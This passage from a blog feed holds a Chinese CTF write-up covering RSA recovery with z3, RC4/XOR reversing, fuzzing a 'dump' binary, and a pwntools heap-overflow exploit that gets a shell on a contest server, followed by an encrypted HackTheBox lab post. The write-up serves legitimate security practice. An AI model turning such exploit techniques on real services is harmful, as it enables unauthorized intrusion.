class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到第一段flag：flag{d50d53cd-e2ce-</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091602094-2096860699.png" alt="image-20241216091551494"></p><p>第二部分就是一个有限域下的逆元，对hint求逆元我们可以得到两个等式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091623283-945716044.png" alt="image-20241216091612697"></p><p>直接z3解方程，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">21626909171908453692251924387103943429444078378390804029791359086344901457614128315777353777946154715705188025455454883506581852192745448695330171712065848059085447176298338547611168540505303622649991647459241389851267706481741195973923366166350969428740106246575652922070364437283707248673414247015834408154336841845500174634585533145550612240655077795822499312831628265010867392272132327421316583927430144370227936025377802536431841460046560013098106494136549616711676888653891244666437683890387799042293066126208312839317392500611947692798756916972089791796065424069966139988959825520104626886407271566397598014479</span></span><br><span class="line">c2 = <span class="number">569516604779891642229626563202425917599205242605000009759024900334197676760498875709356073629224710968242118774272590035957794014944814569027666346273772760891740151661832004406395109811886627118507348575757378450205961170154177578337894121169344562117847542197369098179880407292635572736750972421301634710104680523760640958412310434786115630793487435865984193741176650867539434921286751815555011295375372628772142693142157388409831904845942568574027054385393890634270431602503271189772689768282466095937885481574735502991070696612305833770499878657295850059864341504403869711352220766605065553807072723398104147275</span></span><br><span class="line">hint = <span class="number">7354993101719521835942057560559580408743463323132751631614029356471066763586282676677888312943475827012461736138179904586928941942658362522899594590538632189792057377645275207357701819794899897630241261959366946307314047096789448491079019668061348270530520611478739108630519794038167843924690066067571126829134798676602734885527731532719971211866068475981470917729745697545742042055696088126726481101239997605997896836996320123720551222524217796125190116733813486368990126242621202368626320634775326774029367415577855148616903730121702683124218622095514962048699336270886055555358735126758449948884277874079744761833</span></span><br><span class="line"></span><br><span class="line">x = inverse(hint, n2)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">514</span> * p - <span class="number">114</span> * q == x)</span><br><span class="line">solver.add(p * q == n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    p_val = model[p].as_long()</span><br><span class="line">    q_val = model[q].as_long()</span><br><span class="line"></span><br><span class="line">    d = inverse(<span class="number">0x10001</span>, (p_val - <span class="number">1</span>) * (q_val - <span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c2, d, n2)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得到后一段flag：453b-b352-ab1385bd22af}</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091644221-341610445.png" alt="image-20241216091633317"></p><p>得到最终flag：</p><p><code>flag&#123;d50d53cd-e2ce-453b-b352-ab1385bd22af&#125;</code></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ezCsky"><a href="#ezCsky" class="headerlink" title="ezCsky"></a>ezCsky</h2><p>题目提示使用了国产的交叉编译链对tbox的固件程序进行了编译，ida直接反编译的话会有一个异架构异常，网上搜一下，找到一篇<a href="https://www.iotsec-zone.com/article/379">参考文章</a>，然后直接用arm小端反编译，还是很难看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091736250-732638104.png" alt="image-20241216091725499"></p><p>但是基本的加密逻辑能大概看出来，有RC4有异或unk_8AA0</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091741237-1476403439.png" alt="image-20241216091730600"></p><p>没办法调，这块儿fuzz了好久，密文肯定是无脑存unk_8AA0的，key是”testkey”，肯定是用于RC4的key是没得跑的，但是不知道有没有用这个还有异或的逻辑，后面一步步fuzz的，先解RC4再解xor，先xor再RC4，然后试探xor的逻辑选取常见的那几种，要不就是对上面的key的模取异或，要不就是经典的前一个等于前一个异或后一个，然后逆回去，最后fuzz了很久（雾）。。。。</p><p>最终的逆向逻辑是先无魔改RC4，然后走一个前后异或（从最后一个异或回去即可）</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091747672-740300043.png" alt="image-20241216091736652"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">&quot;testkey&quot;</span></span><br><span class="line"></span><br><span class="line">data=[<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x06</span>,<span class="number">0x1c</span>,<span class="number">0x1f</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x53</span>,<span class="number">0x57</span>,<span class="number">0x51</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x58</span>,<span class="number">0x56</span>,<span class="number">0x03</span>,<span class="number">0x19</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x03</span>,<span class="number">0x4b</span>,<span class="number">0x14</span>,<span class="number">0x58</span>,<span class="number">0x07</span>,<span class="number">0x02</span>,<span class="number">0x49</span>,<span class="number">0x4c</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x01</span>,<span class="number">0x51</span>,<span class="number">0x0c</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x7d</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for k in range(len(data)):</span></span><br><span class="line"><span class="comment">#     data[k]=data[k]^key[k%7]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    data[i-<span class="number">1</span>]^=data[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[j]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;d0f5b330-9a74-11ef-9afd-acde48001122&#125;</code></p><h2 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h2><p>（最可惜的一题，拿到附件测了两下就知道可以黑盒fuzz了，不是00情况多种的话，我手爆感觉能有血，呜呜呜），先拉到ida大概看了一下，属于是又臭又长，但是看见有命令行里的传参</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091821240-2041104139.png" alt="image-20241216091810486"></p><p>就测了两下，对照密文</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091831890-1363112404.png" alt="image-20241216091821052"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091837256-2095190718.png" alt="image-20241216091826661"></p><p>脑神经寻思紧绷，直接测所有可见字符就好了，奈何测上道题给我榨干了，爆破脚本不太会搓了，直接手撕，给所有可见字符编一下码，接下来就是体力活儿了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091844450-1976891504.png" alt="image-20241216091833780"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span> <span class="number">0x1C</span> <span class="number">0x1D</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x03</span> <span class="number">0x04</span> <span class="number">0x05</span> <span class="number">0x06</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0x09</span> <span class="number">0x0A</span> <span class="number">0x0B</span> <span class="number">0x0C</span> <span class="number">0x0D</span> <span class="number">0x0E</span> <span class="number">0x0F</span> <span class="number">0x10</span> <span class="number">0x11</span> <span class="number">0x12</span> <span class="number">0x13</span> <span class="number">0x14</span> <span class="number">0x15</span> <span class="number">0x16</span> <span class="number">0x17</span> <span class="number">0x18</span> <span class="number">0x19</span> <span class="number">0x1A</span> <span class="number">0x1B</span> <span class="number">0x00</span> <span class="number">0x1E</span> <span class="number">0x1F</span> <span class="number">0x20</span> <span class="number">0x21</span> <span class="number">0x22</span> <span class="number">0x23</span> <span class="number">0x24</span> <span class="number">0x25</span> <span class="number">0x26</span> <span class="number">0x27</span> <span class="number">0x28</span> <span class="number">0x29</span> <span class="number">0x2A</span> <span class="number">0x2B</span> <span class="number">0x2C</span> <span class="number">0x2D</span> <span class="number">0x2E</span> <span class="number">0x2F</span> <span class="number">0x30</span> <span class="number">0x31</span> <span class="number">0x32</span> <span class="number">0x33</span> <span class="number">0x34</span> <span class="number">0x35</span> <span class="number">0x36</span> <span class="number">0x37</span> <span class="number">0x38</span> <span class="number">0x39</span> <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">flag&#123;MTczMDc?MzQ2Ng==&#125;</span><br><span class="line"><span class="comment">#上段中？部分不知道00的对应内容，最后在平台一个个试的最后结果是4（试出来之后不一会儿就给提示说是4了（乐））</span></span><br><span class="line">ABCDEFGHIJKL M NOPQRS T UVWXYZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">02030405060708090a0b0c0d0e0f101112131415161718191a1b</span><br><span class="line">A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1e1f202122232425262728292a2b2c2d</span><br><span class="line">a b c d e f g h i j k l m n o p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1E <span class="number">24</span> <span class="number">38</span> 0E <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0E 05 <span class="number">20</span> <span class="number">00</span> 0E <span class="number">37</span> <span class="number">12</span> 1D 0F <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line">23291e24380e1520370e0520000e3712 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1e <span class="number">24</span> <span class="number">38</span> 0e <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0e 05 <span class="number">20</span> <span class="number">00</span> 0e <span class="number">37</span> <span class="number">12</span> 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1e <span class="number">24</span> <span class="number">38</span> 0e <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0e 05 <span class="number">20</span> 1c 0e <span class="number">37</span> <span class="number">12</span> 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line">1c1d000000000000000000000100000002030405060708090a0b0c0d0e0f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;MTczMDc4MzQ2Ng==&#125;</code></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h2><p>ida反编译不是给人看的，直接鸡爪启动，有add,show,edit三个功能，edit有堆溢出，可以读入40个字节，show会给出堆块的地址，并且有后门，edit可以输入负数，也就是说可以越界，并且有个call rax,根据偏移写入堆块地址，堆块中写入后门，getshell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091924480-1952953316.png" alt="image-20241216091913531"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091934966-125092182.png" alt="image-20241216091924255"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091939379-879390541.png" alt="image-20241216091928723"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;39.105.123.22&quot;</span>,<span class="number">30938</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x080489CE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">k,size,fenshu</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(k))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    io.sendline(fenshu)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">heap_addr=<span class="built_in">int</span>(io.recv(<span class="number">7</span>),<span class="number">16</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x28</span>,p32(heap_addr-<span class="number">37000</span>)+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(<span class="number">0x21</span>)+p32(backdoor))</span><br><span class="line">edit(-<span class="number">8</span>,<span class="number">0x28</span>,p32(heap_addr+<span class="number">32</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091958877-230897655.png" alt="image-20241216091947749"></p><p><code>flag&#123;7c66ca9e-6fdb-4ea1-8c91-e759ae505e87&#125;</code></p>]]></content>
    
    
    <summary type="html">2024 CISCN x 长城杯铁人三项 初赛 WriteUp By Rweboy</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Pro-Labs-RastaLabs</title>
    <link href="https://ya1orin.github.io/posts/71305da9.html"/>
    <id>https://ya1orin.github.io/posts/71305da9.html</id>
    <published>2024-11-20T03:20:44.000Z</published>
    <updated>2024-11-26T09:42:30.983Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="22b00f254d1a5eab0d51e3a7df36b03a5f2d9919783f7a50f4e865115ebe6e68">28496bd636d76b48c43b5ab52cbc884450c22d0e6d0bba81fef3720c8d38e714324791e91428ebba5a12a1cc279a81232095892ce2a0a6cc9dd441d983b201b193858c59b97c3677cafd52201a969d9f5d4438cc7098ca63ea7fdfa7d1f5713326971e0b146377822d80ba4c6a3a77d4e4d7277c9e055b0129c8b1251ab672a0add677432e083fc30ac81e9d88e99aefc34b7211e9521c44e780e6c6c9d026043aba927134429ad9e4c0a3398d3d64290d0f8a05fecaf0a4b490dbb4f0f010c7253e5b2be5bbe5865f0f1c1a5fd1bc4b34773eb24f539d2a8710aa60515db0bd0b4b015b0c1ecc38593b67686438fe6736bb792aa70d1ba060a087435a5010143138fbfe4a340d1481d59ef66470142ccaadb99471055922205da91180382415a66783126da87980efae985c78621ab1f83f8713d9d64b4d0d2c255ed07b6beca6d54159b0f3682b84f134607dbb6a4d52e4859eb1f723acacf0527a35607bd1f83757ba38f9f66920e935386a4e3d1b8f13def018e3ab32f383f281c08256bfbf9edd3f995f92e55fb447186f1d8f7793cca9b1e83940440c11863bd22e0890a5555695363a07ecbc57ff9953b6d5c5d0009d25ebe39dfe14ebb2ef1fa9d30bd0b2515e041941d86eaefa18531e0808d2e9f0e2da94700cfb7799262a8383fec2a63a57f2e2e01f5f6c77bbf805365ad2f979b77342f13332fced68c1b6437c7e23e9ccddb6dcc57047eaf1a3f576762bc0a13752e21261346772c86c9e290d34f9eb4ccaaa19a2adddafc8ead6e0252fed8dfeaff42250a344f5debeed18d469bdb9aa5adad6f41935862e3a8ef20988fc19418ecbf80a613d1de08d49b1612d996b955967c32f7e2b27435a5107197136dcfcf6ac2ea0612385484dddc68638cc5c29ca5e5302832cf8933a3e97f964ae72000e5ff0b89485ecb0223227ee6b9b84dddcce8dcdf88a2838d85388444f9e05fd76f45ad427dcc8bad3275f2e2f3101ede095b6e973203af0b37c3a30bd12811c21e9b4fb3c4ea1d461154b62bdb60544d5bc70513ba90e1cfd10c2e9646fceae39000caa77763b13b792c9a07b204067bbd426d276a923957011a8fe945980ed29f04346cd67de786e1d270fe6fbad6e3f874b90b102c187b423205d0d4ff7fdda219bf3c89e316fcc976a28ae9e09e440b58be4dc176a3cb844fbe27cc7af4c710d973b522094139ae213827df7df38ea78e880fb8d8a23a9628a57e202debd8a9233efa1730530f4675b401a70c52046b733d838ececb408889cc6ed19ce296feb150c0bbdf7bae53237628fb135705f56f5d9278547bde7001fca3803a9e5486fee43e2f128530f8595e8202d0549cf6ac06937c662ad528aa84fb4d921996110b3e992aaa1d485bc401196c3785647b180a5ec92ce942ecb7cdf225220316d82a000d71073d35a9cf57ac4a0db195f92bb1ca099e49fd6bd5ea3984b2d41b71bad531e6681768ec018e5c8fd41c815f1cc731c9b17a9cb95a602c9ebaa5157021a0a362dcfc7a2a802a94511699d44271cf38a0d9460715af51f95353e74bd81e44b8275a0cef74250c87fb514859ce8480b6f017608ef83fb790f0390043750e7fe2a8a1d1d07b6ed838e1f943fe8208df640ce4b5c8c8f6e6ffcd438b400130cacec86afc7623cd3487297e1e5d24cca67d01dee885fa765b9b3ff8a823053af67620a6c50a96b84a7179987d207c5c4371567ed655d38e1efdedff6d9c9e39246e9e50c86b10d53bc7e9b034b8041b508ef301aa1ecd9f6cd7bf09c2b233113afcb3ea2e2d8495aa614c8d23a43255cfbcd966970d4a353be51f62f11760bbc45c86e6dbb8feec4626ba690b5b6867151d170d602954cc557a17b9ace07ac22d7a8d385b3087bddc19d0260322cac0223d7d259e873eb4f099aa64813cca7eea9157a2cffd69df0661cec05955fc227affa24be2cb6d74a6f2a6f06419b9dd74dad2b8b20958c5d78cfdf5ed64ab4cd7bb39ccffac0a157a423bed781ee997a527013b601a1f8f7216187c4f43fba7e4e84e4193c431651c8f12731cc3e497751b3c8148f0ea0081975f0eea8b1bcc7173a8942aa0984442143828107aa21e8f76e6e43670a01fbb2cf74b75f5260dedff848b4677eadefc079218ba64396533f43c149f39633d7f9d0d31f172ea29e82c8c328a91c783ad4ef3e956ae4e76d254e4299da15155ab4d4e7ade2faae924e6c9efe099f8a103854c10cb91428db4ecbd9bae8b173cbeb4695632ff17c41690bee7b09c7217642ce8efd0cd53017e1124a8f935f6210e7f43a115a73b36211db275cbecad5784614d67f8300ca5469000bef9ba0d20aa292d152a2e767b441ec0be9232d37b8d2d457a23ac174b1286fb6b621efbbf96e0fb93038bfec58c04654099ea1483780a3bf7a37c50ba9fa2072ab0fe9af5e61d40ad1a0f66934627790127e624f8bfb5b7432e125afe8a56623eceb6610339c3dcd7570f1312274c1f14dbb463272f5b58a673dc63978413f6311607d968361e814c1c426303b81528babe40c50697eb4b9eb584f9cf6f44e8122a9c27e9c8b2f2fe2bd4437995be48f93b2bca8135e08ac3d99dc37e55fb0fd14547f50f319423102a40cf7fb96a1b021b30809fcbe3fc9930921d341c9decc692e32ec365387de9fd63ccb95df418fe48f79a5257ccf1ffff5fc0cce7292272efee80a9909163bafdd02ca87244e852c59f41ee866f1a21191f02ef8e6309c467b7a9ac465be98630aa1da690de0b2aafa03b17261273715f496e4856d445355cfba72af749ea9f1636ced09604986ef23ef4ad1afbb4e4468857ec5f45c8a41631c8ed6696f532b4cd4a8c38ead4a26c8472469336ea384434fa8e52b7073566d5253c2b54eefac95acfbe4c01c098e8789e9b7f26dadbe4198412ea358d49eda77a542519677e2c5d484015768136b90423b9ebd9c0967314cf3a3126a0eb7d496bd114ff7f2575ed2c7381ce4cc5970b0691e00244eb1c056c43c4e33151b5fe6f1a62164a5b585143f950d26e07746bd3a1b2bf8c335d8d82331bc3d6b16ce695b62301ef3537b8d59e07277ea5d4c98b04b82457f45828d9b15578361991ff6f2cd52fbc16c05d79e803c51aafc9394d074a2e19ef35a6dd856eacc5da08c70a4751ce4a3327ed71c6aa0f300ae5b06b43478cd7e9f144b4116478e4c56a499d9b3c4c84ada8c114f4441b4bfc411a5ae0218f7483d6f9dc0994f54424d58f6269deb3a5af9da484e7fa90ff4015a8ba5a5a00a9e0e1710cf4028b5c2491bc0ae8904b13bcc7bd571e2c7b2177b0aab39274dd4189f968cd14da089673f932bfe1e10b42870e7b6cfb4e4f43981a11c9a2783fd05ba01fde987c1e4e6001d785ffc7421d7fcd96b7969aa20bc2324b342354b29add2582e133231f874aacf9d341aacb2b7b71191ae1adc84f6a28ba1d8cffe67f992ffa5c217b3f8342dc36371612947099425474ab28f94e82f9f9644b40b346d4fc55ab3ad080d2956c7feaaafc426ed4685eea38ef4fba0f2e65df84fa5ebf90a50169ad08c80845fbb2fb511c4a2678b82761a425523c6696954a28ce0d79e95be6414409717a59fdfd340c3eb24e91da6197a2e7cbfef0f35165e70fe6d993203b562ab6cff98562996168326538b94ee72af16d89047af6a41805588f1dc871e557df878eb647f9abffcc0aee6784dd770982873b230b9d2a6d707f0c637a1b865279074569e14df5bd37084e1f4cf9971cd5d5fc09af6555ca1e850d7cfa621de93f7ef8f65b88cb34bf0993b7eacb467890171432c374712ed3a19e696e46724b780e9912e1bdbe19845dfb7de33ace261ca125de1c3f6100be3ed63ad4d16b281289cd11455a0c133d67f7aba19dbd2f85829845da0eb40e0ea53d30ecfd69d067e97772285ab369e646472f5e826161e1598eecc82ed4af3cb36a233b77380cdacd27e9b802f9cfe0e33c8b9f47ce66c49bad47fef0ec9e6c3012764fc7927b9f220fd57b1e3730ffa6a72432cecad42b8215b9eabf98a652957d8054312d5accbfc9e66e24ea50a5d05d62e55d47b44d693f4808bfd5891b8401346f2b8069c7108c707146796001fd7bb866a71fa4e0ab66e80fe9c2ec3debcf2993e7b92883193bdfe3582c22785126794d6b6fc6ea0f86e77eb12bdf4a5c0eab5f21dbb0e545fbace9fc721061cffa80c3abe39fac8635adb940688957d165c6363e9913972ebd8b4b45549ba1d19bea94912bb9ae16f1b4cb242842b4ddb8c9c285cd913e961002dccc529efe22fff01e1a001b0ac4221a916bd93a95943ed95e98be7c448aade99d0c1d6f17022e2bc6513f4786a924f7b76b88e763b9070c0f53039fda4d95a0d7c4f4ced50625937aa521739874cfc317a1375448b2c15f435decb3a6a91b92552904f5eae50b99d19a27011aacca0b8ad4076463b37369f5886cfd5456b938f2b9b4e9849e4d08131e23d875676983d470c6f398b34a538dd7fbe343823af876bfe78ab12b4d16833ff57e7bbd054286ffdfc7966e616985df82d1d61e40bc94e6cbd5ca8b9da17a84173dadc4c36003df9241901d175ac860415e1fe945d458940b2e8d725294397bd87a16a7b1fd9caf8f707f2f94578206c58e5fbcfde4092143e033701dc44a119582feeb6bd83d9528802f227134ebec818bb8f0e63ee275cdab2f9da32a0a6322df3622ca8f4e602162b5cb88d9ba06f3441a9123a84babb11f3529422a15f9538fdce7e65c8f8c68c90879b3cfd19a335827ed861265a391ff1f408e17a48a01b9c1cd99ea2e1a2b7663e09f2f83d9f4e7f2f68356d1702c4a03def17ac0b0e258e79c762abbbe195c79cbf084ae1d56f660a9d8ef436710e7f598b3681f1eb613307e311adc27927c6bafd21ecd50edaaae8234883419ff1cd4c69a91648762f412a6553f74cd8d18731b62f460777182d1423086813764c7d7531fdeef0a2d719bbe179fe6ba3383a4abe9a5be0c187a09cea3c936c249e53823d588652743c6bcf959a117ef19ccc7bf57c4e4aa9dafdc573007940f2532e12a6de1d2173f3e81eedf6599b16ad149addc9ca265c7a37bf3226e2bbe0ef405c7a83de45fa853bab16e1896551b076e02c2fa239f3108663326a069ace9a61ea19dd686c0876e02d6e00245c31202fd4e155984c6e5b99de595b9b742351889aca942c661d6d5e3db02fefc8520ceac6305443853f13d1ca5f77b970c2a67c49731d797424e3c319d0038d32117b279015676a014454f8b4991aba84b79103aa247ec685b790a88c1be0ed4b568e7fd2b90d990b2290ea818228988321056fa28557f2869678a69fd0759f99631ff1cffb2cedfef5716b20b7a73ce24124da92848e5e0a5471bc64c5029348caedf33592c88bb3d82e887ca1da7221020a5ebf4b01fd037514b6a54fe07c0a1ab032083e6b9482f3ec28dd4b640dcbfa5f4df0b85671268bd160d28dbf8e81d55ef8508191f796eacc8c1b222359abc6a22ca207ede3ad0eaa06143235105d07ee5f3ec7bac7bafdc521a8079533cc8d6ad58bb6ebbb1d16c1b014fea3095c397ef7e306f0dde99d516dab753ba959e37aa502a19085b31bf2c83537c730185519c68c6806c4ad756bcb723acbe36f57fe4648535bf0ab15d7e3f28d7a76d31201a89dec255e9b196474c028e4982b354ae336518fea8e8a643898299e9eb9c82e4adcb735b812f205ba6e259e80fc72844985a05ab18b6a6f430fe4337fbeec21a98148aa9cd1cab550ef1f820b0906d9370d31bc8bf929783d10a77b8a8bcf4ae67611492463420c260437837323f1738d95647777af377a5a24ac7826db523eb1d6d76a5df4e3c839e02a968f67790f9190be754b432809439b6c46709d7619cc1e6220107f8ceba6f6b905ac9b068609f7b301e70e8e0eb8969c68fffb188a1e7dca1f6ab6c3f36b519a849e2a8688352741ae53e3a7b87ce054c58cec5ecf99eac0399932a4cda82c7242b87109e871e5574222587fb3775fce83d5699bdd75bbec9812bc1e65c9706f2e7f1fc65fd297069899f594a3458bdad9decf4ad9f61682591946e0a3e413e6d66a1e1ebf9de642320b770b801e0d0d42e19248a04608265771922e265c64106635f01617d59be8a90b73c4cf12e4cd771230c2af610cafe85f961292f9929cd333c68c06933c5fa0ef4661879fc876bf14c2f7d1a7c844e3043af5475b8ec4aeb24db5fdcdae88a1c1fa8cd2101f4a4bc7aef213784bac9ad73e19252612dd661ae9654b920507b1af1f2cc2c28eff886311ba6852d24b96f996bbabc5